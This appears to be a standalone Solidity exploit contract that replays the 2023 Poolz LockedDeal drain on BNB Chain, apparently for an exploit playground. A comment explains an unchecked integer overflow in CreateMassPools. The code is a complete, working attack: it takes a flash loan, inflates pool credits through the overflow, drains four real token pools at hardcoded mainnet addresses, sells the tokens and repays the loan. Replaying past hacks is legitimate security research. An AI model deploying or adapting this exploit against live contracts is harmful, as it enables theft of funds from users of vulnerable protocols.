// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-03-poolz).
//
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry `ContractTest`
// harness — the flash-loan callback `DPPFlashLoanCall` lives on the test itself
// (`assetTo = address(this)`), so there is no standalone contract to deploy.
// This file is a faithful, self-contained copy of that inline attack
// (testExploit body + DPPFlashLoanCall callback + the four sell* helpers +
// minimal inline interfaces — no imports so it compiles anywhere), deployed
// inside the registry forge project and driven via run(). Logic and constants
// are copied verbatim from test/poolz_exp.sol.
//
// Root cause: Poolz LockedDeal.CreateMassPools() computes the deposit it pulls
// from the caller via getArraySum(), which sums the per-pool _StartAmount[]
// array with plain `+` (no SafeMath) on Solidity 0.6.12 (no built-in overflow
// checks). A two-element amount array [overflow_data, pool_balance], chosen so
// the raw sum wraps mod 2^256 to 1, makes CreateMassPools pull only 1 wei from
// the attacker while still crediting BOTH pools with their full face-value
// _StartAmount[i] (CreatePool performs no check that the contract actually
// holds that much). WithdrawToken() then pays whichever pool's Amount to
// whatever address the pool records as Owner, with no isPoolOwner check — so
// the attacker (who set _Owner = address(this) and _FinishTime = now) redeems
// the second pool's full, inflated Amount = pool_balance immediately, draining
// the *entire* shared vesting balance of that token for every other user.
// Repeated identically for MNZ, SIP, WOD and ECIO.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IWBNB {
    function balanceOf(address) external view returns (uint256);
    function withdraw(uint256) external;
    function transfer(address, uint256) external returns (bool);
}

interface IDPPAdvanced {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes memory data) external;
}

interface IPancakeRouter {
    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface ILockedDeal {
    function CreateMassPools(
        address _Token,
        uint64[] memory _FinishTime,
        uint256[] memory _StartAmount,
        address[] memory _Owner
    ) external returns (uint256, uint256);

    function WithdrawToken(
        uint256 _PoolId
    ) external returns (bool);
}

contract PoolzDrain {
    IDPPAdvanced constant dppAdvanced = IDPPAdvanced(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);
    IWBNB constant wbnb = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);

    IERC20 constant mnz = IERC20(0x861f1E1397daD68289e8f6a09a2ebb567f1B895C);
    IERC20 constant wod = IERC20(0x298632D8EA20d321fAB1C9B473df5dBDA249B2b6);
    IERC20 constant sip = IERC20(0x9e5965d28E8D44CAE8F9b809396E0931F9Df71CA);
    IERC20 constant ecio = IERC20(0x327A3e880bF2674Ee40b6f872be2050Ed406b021);
    IERC20 constant busd = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);

    IPancakeRouter constant pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));

    ILockedDeal constant poolzpool = ILockedDeal(payable(0x8BfAA473a899439d8E07BF86a8C6cE5De42fE54B));

    // entrypoint: kick off the flash loan; DPPFlashLoanCall does the rest.
    function run() external {
        bytes memory data = "poolz";
        address assetTo = address(this);
        dppAdvanced.flashLoan(1e18, 0, assetTo, data);
    }

    function DPPFlashLoanCall(address, uint256, uint256, bytes memory data) external {
        if (keccak256(data) == keccak256("poolz")) {
            address[] memory swapPath = new address[](3);

            wbnb.withdraw(1e18);

            swapPath[0] = address(wbnb);
            swapPath[1] = address(busd);
            swapPath[2] = address(mnz);

            pancakeRouter.swapExactETHForTokens{value: 1 ether}(1, swapPath, address(this), block.timestamp);

            mnz.approve(address(poolzpool), type(uint256).max);
            sip.approve(address(poolzpool), type(uint256).max);
            ecio.approve(address(poolzpool), type(uint256).max);
            wod.approve(address(poolzpool), type(uint256).max);

            mnz.approve(address(pancakeRouter), type(uint256).max);
            sip.approve(address(pancakeRouter), type(uint256).max);
            ecio.approve(address(pancakeRouter), type(uint256).max);
            wod.approve(address(pancakeRouter), type(uint256).max);

            uint64[] memory begintime = new uint64[](2);
            begintime[0] = uint64(block.timestamp);
            begintime[1] = uint64(block.timestamp);

            address[] memory owner_addr = new address[](2);
            owner_addr[0] = address(this);
            owner_addr[1] = address(this);

            // === mnz leg ===
            drainPool(address(mnz), begintime, owner_addr);
            sellmnz();

            // === sip leg ===
            wbnb.withdraw(1e18);
            swapPath[0] = address(wbnb);
            swapPath[1] = address(busd);
            swapPath[2] = address(sip);
            pancakeRouter.swapExactETHForTokens{value: 1 ether}(1, swapPath, address(this), block.timestamp);
            drainPool(address(sip), begintime, owner_addr);
            sellsip();

            // === wod leg ===
            wbnb.withdraw(1e18);
            address[] memory simplepath = new address[](2);
            simplepath[0] = address(wbnb);
            simplepath[1] = address(wod);
            pancakeRouter.swapExactETHForTokens{value: 1 ether}(1, simplepath, address(this), block.timestamp);
            drainPool(address(wod), begintime, owner_addr);
            sellwod();

            // === ecio leg ===
            wbnb.withdraw(1e18);
            swapPath[0] = address(wbnb);
            swapPath[1] = address(busd);
            swapPath[2] = address(ecio);
            pancakeRouter.swapExactETHForTokens{value: 1 ether}(1, swapPath, address(this), block.timestamp);
            drainPool(address(ecio), begintime, owner_addr);
            sellecio();

            wbnb.transfer(address(dppAdvanced), 1 * 1e18);
        }
    }

    // shared overflow-drain logic for one token leg: build the wrapped-sum
    // amount array, CreateMassPools, then withdraw the inflated second pool.
    function drainPool(address token, uint64[] memory begintime, address[] memory owner_addr) internal {
        uint256 balance = IERC20(token).balanceOf(address(poolzpool));
        uint256 overflow_data = type(uint256).max - balance + 2;

        uint256[] memory transfer_data = new uint256[](2);
        transfer_data[0] = overflow_data;
        transfer_data[1] = balance;

        (, uint256 lastPoolId) = poolzpool.CreateMassPools(token, begintime, transfer_data, owner_addr);

        poolzpool.WithdrawToken(lastPoolId);
    }

    function sellecio() internal {
        address[] memory path = new address[](3);
        path[0] = address(ecio);
        path[1] = address(busd);
        path[2] = address(wbnb);
        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            ecio.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    function sellwod() internal {
        address[] memory path = new address[](2);
        path[0] = address(wod);
        path[1] = address(wbnb);
        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            wod.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    function sellsip() internal {
        address[] memory path = new address[](3);
        path[0] = address(sip);
        path[1] = address(busd);
        path[2] = address(wbnb);
        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            sip.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    function sellmnz() internal {
        address[] memory path = new address[](3);
        path[0] = address(mnz);
        path[1] = address(busd);
        path[2] = address(wbnb);
        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            mnz.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    receive() external payable {}
}
